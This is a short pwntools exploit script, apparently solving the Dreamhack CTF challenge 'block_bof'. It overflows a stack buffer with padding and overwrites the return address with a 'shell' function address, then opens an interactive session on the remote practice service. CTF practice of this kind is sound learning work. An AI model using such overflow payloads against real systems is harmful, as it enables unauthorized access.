from pwn import *

#context.log_level = 'debug'

p = remote('host3.dreamhack.games', 15416)
#p = process("./block_bof")

shell = 0x401278

payload = b"A"*15 + b'\x00'
payload += b"B" * (0x38 - len(payload))
payload += p64(shell)
assert(len(payload) == 0x40)

p.send(b"A"*10)
p.sendlineafter(b"Your comment : ", payload)

p.interactive()